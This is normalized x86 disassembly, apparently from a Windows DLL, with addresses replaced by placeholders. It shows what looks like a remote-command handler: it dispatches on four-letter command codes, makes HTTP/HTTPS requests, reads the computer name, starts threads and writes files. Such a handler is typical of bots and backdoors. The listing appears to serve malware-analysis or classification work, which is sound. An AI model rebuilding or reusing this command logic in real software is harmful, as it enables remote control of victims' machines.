mov esi [ esi + 0x10 ]
test esi esi
mov [ esp + 0x10 ] esi
jne r-xdata
mov ebx [ eax + 0x8 ]
mov eax edi
shl eax 0xa
inc edi
or ecx 0xffffffff
lea edx [ eax + ebp + 0x4f0 ]
mov [ esp + 0x20 ] edi
mov edi ebx
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x20 ]
and ecx 0x3
cmp eax 0x1
[ edi ] [ esi ]
jne r-xdata
mov [ esp + edi + 0x2c ] al
inc edi
mov esi [ esp + 0x10 ]
jmp r-xdata
lea ecx [ ebp + 0x8f0 ]
push 0x400
push ecx
push rw-data
push rw-data
push 0x0
push ebx
call sub_10004cd0
lea edx [ ebp + 0x30 ]
push 0x40
push edx
push 0x0
push rw-data
push 0x0
push ebx
call sub_10004cd0
mov ebx [ esp + 0x48 ]
add esp 0x30
mov ecx [ esp + 0x10 ]
push 0xffffffff
push rw-data
push 0x0
push rw-data
push ecx
call sub_100016f0
add esp 0x14
test eax eax
je r-xdata
mov eax rw-data
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ ebp + 0x70 ]
[ edi ]
not ecx
sub edi ecx
mov ebx [ esp + 0x18 ]
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x1c ] 0x1
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x20 ]
sub_100056b0
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
call [ lstrlenA@IAT ]
mov esi [ esp + 0xc ]
mov ecx eax
xor eax eax
[ esi ] [ edi ]
pop edi
pop esi
sete al
retn 0x8
sub_100056d0
sub esp 0x210
mov edx [ esp + 0x214 ]
push ebx
push ebp
mov ebp ecx
push esi
lea eax [ esp + 0x11c ]
push edi
lea ecx [ esp + 0x20 ]
push eax
xor ebx ebx
push ecx
push edx
mov ecx ebp
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1c ] ebx
call sub_10005870
test eax eax
je r-xdata
mov esi 0x50
mov edi 0x84000100
mov esi 0x1bb
mov edi 0x84800100
jmp r-xdata
mov esi [ esp + 0x234 ]
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
lea ecx [ esp + 0x34 ]
push esi
push ecx
push eax
call [ rw-data ]
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ rw-data ]
test eax eax
mov [ esp + 0x1c ] eax
je r-xdata
xor ecx ecx
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jmp r-xdata
push 0x0
push edi
push 0x0
push 0x0
lea edx [ esp + 0x130 ]
push rw-data
push edx
push rw-data
push eax
call [ rw-data ]
mov ebx eax
mov ebp [ esp + 0x228 ]
test ebx ebx
mov [ ebp ] esi
je r-xdata
mov edx [ ebp + 0xcf4 ]
lea ecx [ esp + 0x18 ]
push ecx
push 0x80000
push edx
push ebx
call [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x22c ]
push ecx
mov eax edx
push esi
neg eax
sbb eax eax
push eax
push edx
push ebx
call [ rw-data ]
mov edi eax
xor esi esi
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push ebx
call [ rw-data ]
xor edi edi
mov eax [ esp + 0x18 ]
add esi eax
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push eax
call [ rw-data ]
mov edx [ ebp + 0xcf4 ]
mov ecx 0x80000
lea eax [ esp + 0x18 ]
sub ecx esi
push eax
add edx esi
push ecx
push edx
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
test edi edi
jne r-xdata
push eax
call [ rw-data ]
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
mov eax [ ecx + 0xcf4 ]
pop ebx
add esp 0x210
retn 0x14
mov eax [ esp + 0x14 ]
mov [ ebp ] edi
pop edi
pop esi
mov eax [ eax + 0xcf4 ]
pop ebp
pop ebx
add esp 0x210
retn 0x14
sub_10005870
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
push rw-data
mov edi ecx
push esi
xor ebx ebx
call sub_100056b0
test eax eax
je r-xdata
push rw-data
push esi
mov ecx edi
call sub_100056b0
neg eax
sbb eax eax
and eax 0x7
mov eax 0x8
mov ebx 0x1
jmp r-xdata
mov edx ecx
sub edx eax
mov [ edx + edi ] 0x0
mov al [ ecx + esi ]
mov edi [ esp + 0x1c ]
mov edx ecx
test al al
je r-xdata
test dl dl
je r-xdata
mov dl [ eax + esi ]
mov edi [ esp + 0x18 ]
cmp dl 0x2f
mov ecx eax
je r-xdata
sub ecx edx
mov eax ebx
mov [ ecx + edi ] 0x0
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
cmp al 0xd
je r-xdata
cmp dl 0xd
je r-xdata
cmp al 0xa
je r-xdata
cmp dl 0xa
je r-xdata
mov ebp ecx
sub ebp edx
inc ecx
mov [ edi + ebp ] al
mov al [ ecx + esi ]
test al al
jne r-xdata
mov ebp ecx
sub ebp eax
inc ecx
mov [ edi + ebp ] dl
mov dl [ ecx + esi ]
cmp dl 0x2f
jne r-xdata
sub_10005920
sub esp 0x234
push ebx
mov ebx [ esp + 0x23c ]
push ebp
push esi
push edi
push 0x20
mov edi 0x1
push 0x0
mov ebp ecx
push ebx
mov [ esp + 0x1c ] edi
call sub_10005350
mov esi eax
mov eax [ ebp + 0xef8 ]
movsx ecx [ eax ]
push ecx
call sub_1000a6d5
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebx ]
and eax 0xffffff
or eax 0x20000000
cmp eax 0x204e4c46
ja r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x234
retn 0x4
cmp eax 0x20525355
ja r-xdata
je r-xdata
cmp eax 0x2054534c
ja r-xdata
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp eax 0x2047534c
ja r-xdata
cmp eax 0x20585555
ja r-xdata
je r-xdata
push 0x20
push 0x0
push ebx
mov ecx ebp
call sub_10005350
mov eax [ ebp + 0xe50 ]
cmp eax edi
je r-xdata
cmp eax 0x20504c42
ja r-xdata
cmp eax 0x204c4143
ja r-xdata
je r-xdata
cmp eax 0x20595251
je r-xdata
je r-xdata
cmp eax 0x20534e41
ja r-xdata
mov edi [ ebp + 0xf00 ]
mov esi rw-data
mov eax edi
test eax eax
jne r-xdata
cmp eax 0x20524658
ja r-xdata
je r-xdata
cmp eax 0x204c4d52
ja r-xdata
je r-xdata
cmp eax 0x20474843
ja r-xdata
mov eax [ ebp + 0xcf4 ]
push ebx
add eax 0x800
push rw-data
push eax
call sub_1000a135
add esp 0xc
cmp eax 0x2054554f
je r-xdata
cmp eax 0x20544f4e
jne r-xdata
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp eax 0x20525042
jne r-xdata
je r-xdata
mov eax [ ebp + 0x28 ]
test eax eax
jne r-xdata
cmp eax 0x204f5249
ja r-xdata
cmp eax 0x204c5255
jne r-xdata
je r-xdata
cmp eax 0x204b414e
ja r-xdata
cmp eax 0x20474e52
ja r-xdata
je r-xdata
pop edi
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp eax 0x20584255
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp eax 0x20525643
je r-xdata
mov esi rw-data
mov eax edi
mov edi [ ebp + 0xf0c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ ebp + 0x470 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0xf08 ]
push ecx
mov ecx ebp
call sub_10005420
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov edx [ ebp + 0xcf4 ]
push 0x20
push 0x0
push edx
mov ecx ebp
call sub_10005350
cmp eax 0x6
jge r-xdata
cmp eax 0x20505250
je r-xdata
mov eax [ ebp + 0xf78 ]
push eax
push rw-data
lea edx [ eax + 0x1 ]
lea eax [ ebp + 0xcf8 ]
push eax
mov [ ebp + 0xf78 ] edx
call sub_100088c0
mov eax [ esp + 0x1c ]
add esp 0xc
mov [ ebp + 0x28 ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp eax 0x20504253
jne r-xdata
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov eax [ ebp + 0xf00 ]
lea edx [ esp + 0x14 ]
push edx
push eax
cmp eax 0x204c4441
je r-xdata
cmp eax 0x204b4341
jne r-xdata
je r-xdata
cmp eax 0x20475049
jne r-xdata
je r-xdata
cmp eax 0x20474441
ja r-xdata
mov ecx [ ebp + 0xf04 ]
lea eax [ esp + 0x14 ]
push eax
push ecx
call sub_1000a6ca
mov edx [ ebp + 0xcf4 ]
add esp 0x4
push eax
push edx
jmp r-xdata
cmp eax 0x20534253
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ ebp + 0xf78 ]
lea ecx [ ebp + 0x4f0 ]
push ecx
push eax
lea edx [ eax + 0x1 ]
push rw-data
mov [ ebp + 0xf78 ] edx
add ebp 0xcf8
push ebp
call sub_100088c0
mov eax [ esp + 0x20 ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ ebp + 0xf00 ]
mov esi rw-data
pop edi
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp eax 0x20524556
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
sub eax 0x204e4c49
je r-xdata
mov edi [ ebp + 0xf00 ]
mov esi rw-data
mov eax edi
cmp eax 0x204c4843
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp [ ebp + 0xe50 ] 0x4
jne r-xdata
cmp eax 0x2047534d
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov esi edi
mov eax rw-data
cmp eax 0x20474d52
je r-xdata
cmp eax 0x20474552
jne r-xdata
je r-xdata
lea ecx [ ebp + 0xcf8 ]
call sub_100082e0
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
pop edi
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
xor edi edi
push 0x20
push edi
push ebx
mov ecx ebp
call sub_10005350
cmp eax 0x1
jne r-xdata
sub eax 0x5
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ ebp + 0xf00 ]
lea edx [ esp + 0x3c ]
push edx
push eax
mov ecx ebp
call sub_10006fc0
mov edx [ ebp + 0xf78 ]
lea ecx [ esp + 0x3c ]
push ecx
push rw-data
push edx
add ebp 0xcf8
push rw-data
push ebp
call sub_100088c0
mov eax [ esp + 0x24 ]
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
pop edi
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov eax [ ebp + 0xe50 ]
cmp eax edi
je r-xdata
cmp eax 0x20494f4a
jne r-xdata
cmp esi 0x5
je r-xdata
add eax 0x474
inc esi
cmp eax rw-data
jl r-xdata
cmp eax 0x20474e51
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp eax 0x20455942
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
lea esi [ ebp + 0xcf8 ]
mov ecx esi
call sub_10008810
mov eax [ ebp + 0xf04 ]
mov ecx [ ebp + 0xcf4 ]
push eax
push ecx
call [ lstrcpyA@IAT ]
mov edx [ ebp + 0xcf4 ]
xor edi edi
push 0x3a
push edi
push edx
mov ecx ebp
call sub_10005350
cmp eax 0x2
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ ebp + 0xf00 ]
mov esi rw-data
mov [ esp + 0x10 ] edi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
push edi
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
cmp esi 0x4
jge r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x234
retn 0x4
mov edx [ ebp + 0xf0c ]
lea ecx [ esp + 0x7c ]
push ecx
push edx
call sub_100011d0
add esp 0x8
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov eax [ ebp + 0x10 ]
lea edx [ esp + 0x14 ]
push 0x0
push edx
push 0x6
push rw-data
push eax
mov [ esp + 0x24 ] 0x0
call [ WriteFile@IAT ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp eax 0x20464347
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ ebp + 0xef8 ]
mov ecx esi
push eax
call sub_100085b0
mov ecx [ ebp + 0xefc ]
push ecx
call sub_1000a6ca
add esp 0x4
mov ecx esi
push eax
call sub_10008630
mov ecx esi
call sub_10008460
test eax eax
je r-xdata
mov [ esp + 0x10 ] edi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
call sub_1000a6ca
mov ecx [ ebp + 0xcf4 ]
add esp 0x4
push eax
push ecx
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov edx [ ebp + 0xf04 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
lea esi [ ebp + 0xcf8 ]
call sub_1000a6ca
add esp 0x4
mov ecx esi
push eax
mov eax [ ebp + 0xcf4 ]
push eax
call sub_100082e0
mov eax [ ebp + 0x28 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xf04 ]
mov [ esp + 0x18 ] 0x0
push ecx
call sub_1000a6ca
add esp 0x4
mov edi eax
lea ebx [ ebp + 0xcf8 ]
lea ebx [ esi + esi * 2 ]
mov edi [ ebp + 0xf0c ]
shl ebx 0x5
sub ebx esi
or ecx 0xffffffff
xor eax eax
push 0x3a
lea ebx [ ebx + ebx * 2 ]
shl ebx 0x2
[ edi ]
not ecx
sub edi ecx
lea edx [ ebx + rw-data ]
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ ebx + rw-data ]
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebx + rw-data ]
and ecx 0x3
mov [ esp + 0x24 ] eax
[ edi ] [ esi ]
mov [ eax ] 0x2
mov edi [ ebp + 0xefc ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ ebx + rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp + 0xf08 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi [ ebp + 0xf00 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi [ ebp + 0xcf4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0xcf4 ]
mov ecx ebp
push eax
call sub_10005350
mov edi [ ebp + 0xef8 ]
or ecx 0xffffffff
xor eax eax
lea edx [ ebx + rw-data ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea edx [ ebx + rw-data ]
[ edi ] [ esi ]
mov edi [ ebp + 0xef8 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0xefc ]
push ecx
call sub_1000a6ca
add esp 0x4
mov [ ebx + rw-data ] ax
mov edx [ ebx + rw-data ]
push edx
call [ ResetEvent@IAT ]
mov eax [ esp + 0x20 ]
push 0x0
push 0x0
push eax
push sub_10008ec0
push 0x0
push 0x0
call [ CreateThread@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x20
push 0x0
push ebx
mov ecx ebp
call sub_10005350
cmp eax edi
jne r-xdata
mov eax [ ebp + 0xf78 ]
mov [ ebp + 0xe50 ] 0x1
push eax
push rw-data
lea edx [ eax + 0x1 ]
push esi
mov [ ebp + 0xf78 ] edx
call sub_100088c0
add esp 0xc
mov [ esp + 0x10 ] eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
lea esi [ ebp + 0xcf8 ]
mov ecx esi
call sub_10008810
mov ecx esi
call sub_10008460
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ ebp + 0xf78 ]
push eax
push rw-data
lea ecx [ eax + 0x1 ]
lea eax [ ebp + 0xcf8 ]
push eax
mov [ ebp + 0xf78 ] ecx
call sub_100088c0
add esp 0xc
lea edx [ ebp + 0x8f0 ]
mov ecx ebp
push edx
call sub_10006c10
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ ebp + 0xcf4 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
mov [ esp + 0x20 ] eax
[ edi ] [ esi ]
mov edx [ ebp + 0xcf4 ]
or ecx 0xffffffff
mov edi edx
[ edi ]
mov eax [ rw-data ]
not ecx
dec ecx
test eax eax
jbe r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
pop edi
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov eax [ ebp + 0xf78 ]
lea ecx [ eax + 0x1 ]
mov [ ebp + 0xf78 ] ecx
mov ebp [ ebp + 0x24 ]
lea ecx [ ebp + 0x4 ]
push ecx
push ecx
push eax
push rw-data
push esi
call sub_100088c0
mov eax [ esp + 0x24 ]
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov [ esp + 0x10 ] edi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
cmp eax edi
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ ebp + 0xcf4 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp + 0xcf4 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x14 ]
mov esi ecx
lea ecx [ esp + 0x7c ]
push eax
push ecx
mov [ esp + 0x1c ] 0x100
call [ GetComputerNameA@IAT ]
mov eax [ ebp + 0xf78 ]
lea edx [ esp + 0x7c ]
push edx
mov edx [ ebp + 0xcf4 ]
lea ecx [ eax + 0x1 ]
push ecx
push edx
push esi
push eax
lea esi [ ebp + 0xcf8 ]
push rw-data
push esi
call sub_100088c0
mov eax [ ebp + 0x24 ]
mov edi [ ebp + 0xf78 ]
mov ecx [ ebp + 0xcf4 ]
add esp 0x1c
add eax 0x4
add edi 0x2
push eax
push rw-data
push ecx
mov [ ebp + 0xf78 ] edi
call sub_1000a135
mov eax [ ebp + 0xcf4 ]
push 0x200
lea edx [ eax + 0x200 ]
push edx
push eax
call sub_10004d90
mov eax [ ebp + 0xcf4 ]
add esp 0x18
mov [ eax + 0x200 ] 0x0
mov edx [ ebp + 0xcf4 ]
mov eax [ ebp + 0xf78 ]
add edx 0x200
push edx
push 0x10088020
push eax
lea ecx [ eax + 0x1 ]
push rw-data
push esi
mov [ ebp + 0xf78 ] ecx
call sub_100088c0
mov eax [ ebp + 0xf78 ]
add esp 0x14
lea ecx [ eax + 0x1 ]
push eax
push rw-data
mov [ ebp + 0xf78 ] ecx
push esi
call sub_100088c0
mov eax [ esp + 0x1c ]
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov [ esp + 0x24 ] rw-data
mov ecx [ ebp + 0xcf4 ]
mov eax rw-data
mov dx [ ecx ]
cmp dx [ eax ]
jne r-xdata
mov eax [ ebp + 0xefc ]
mov esi rw-data
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ ebp + 0xcf4 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp + 0xcf4 ]
or ecx 0xffffffff
mov edi edx
mov esi [ rw-data ]
[ edi ]
mov eax [ esp + 0x20 ]
mov edi [ esp + 0x24 ]
not ecx
dec ecx
inc eax
add edi 0x100
cmp eax esi
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] edi
jb r-xdata
xor ebx ebx
mov eax [ ebp + 0xcf4 ]
lea edx [ esp + 0x14 ]
push edx
push 0x80000
push eax
mov ecx ebx
call sub_10008680
mov ecx [ ebp + 0xcf4 ]
mov esi [ esp + 0x14 ]
push 0x20
push 0x0
push ecx
mov ecx ebp
sub edi esi
call sub_10005350
mov eax [ ebp + 0xef8 ]
mov esi rw-data
lea eax [ esp + 0x14 ]
push eax
push edi
push ecx
mov ecx ebx
call sub_100082e0
mov eax [ ebp + 0xcf4 ]
lea edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x18 ]
lea ecx [ eax + 0x800 ]
push 0x800
push ecx
push edx
push eax
call sub_100014d0
add esp 0x14
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x24 ]
add edx ecx
push eax
push rw-data
push edx
call sub_1000a135
mov edi [ ebp + 0xcf4 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
mov [ esp + 0x2c ] eax
mov eax [ rw-data ]
dec ecx
test eax eax
mov [ esp + 0x28 ] ecx
jbe r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ rw-data ]
inc eax
add ebx 0x1c8
cmp eax ecx
mov [ esp + 0x2c ] eax
jb r-xdata
mov eax [ esp + 0x24 ]
inc edi
push edi
push eax
call sub_10009100
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov edi [ ebp + 0xcf4 ]
mov eax ecx
lea esi [ edi + 0x800 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x1c ]
mov ecx [ ebp + 0xcf4 ]
mov [ esp + 0x14 ] eax
mov [ ecx + eax ] 0x0
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov [ esp + 0x18 ] 0x1
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ rw-data ]
push 0x40
lea edx [ ebx + ecx ]
push edx
call sub_10009040
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebx + ecx + 0x1c4 ]
lea esi [ ebx + ecx ]
test al 0x8
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
test al 0x4
je r-xdata
mov [ esp + 0x18 ] 0x4
jmp r-xdata
mov edx [ ebp + 0xcf4 ]
push 0x20
push 0x0
push edx
mov ecx ebp
call sub_10005350
mov esi eax
mov eax [ ebp + 0xe50 ]
sub eax 0x2
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
test al 0x2
je r-xdata
mov [ esp + 0x18 ] 0x3
jmp r-xdata
sub edi ebx
sub edi ecx
dec edi
mov eax edi
lea edi [ esp + 0x7c ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ ebp + 0xcf4 ]
and ecx 0x3
[ edi ] [ esi ]
mov [ esp + eax + 0x7c ] 0x0
mov eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x80 ]
add edx eax
push ecx
push rw-data
push edx
call sub_1000a135
mov edi [ ebp + 0xcf4 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
mov [ esp + 0x28 ] ecx
mov edx [ ebp + 0xef8 ]
push rw-data
push edx
call sub_10009100
add esp 0x8
test eax eax
jne r-xdata
dec eax
je r-xdata
mov [ esp + 0x18 ] 0x2
mov eax [ ebp + 0xef8 ]
push rw-data
push eax
call sub_10009100
add esp 0x8
test eax eax
jne r-xdata
mov ebp [ ebp + 0xefc ]
test ebp ebp
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ ebp + 0xcf4 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ebx [ esp + 0x18 ]
mov eax [ ebp + 0xef8 ]
add ebx 0x2
push eax
mov [ esp + 0x1c ] ebx
call sub_10009100
add esp 0x8
test eax eax
jne r-xdata
sub eax 0x2
jne r-xdata
mov eax [ ebp + 0xef8 ]
push rw-data
push eax
call sub_10009100
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp + 0xefc ]
push rw-data
push ecx
call sub_10009100
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x5
mov [ rw-data ] 0x1
pop ebx
add esp 0x234
retn 0x4
push ebp
call sub_1000a6ca
add esp 0x4
mov [ rw-data ] eax
mov eax [ esp + 0x10 ]
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x234
retn 0x4
mov ecx [ esp + 0x14 ]
mov edx [ ebp + 0xcf4 ]
lea eax [ esp + 0x1c ]
push 0x0
push eax
mov eax [ ebp + 0x10 ]
push ecx
push edx
push eax
call [ WriteFile@IAT ]
mov ecx [ ebp + 0xcf4 ]
push rw-data
push ecx
call sub_10009100
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0xefc ]
test eax eax
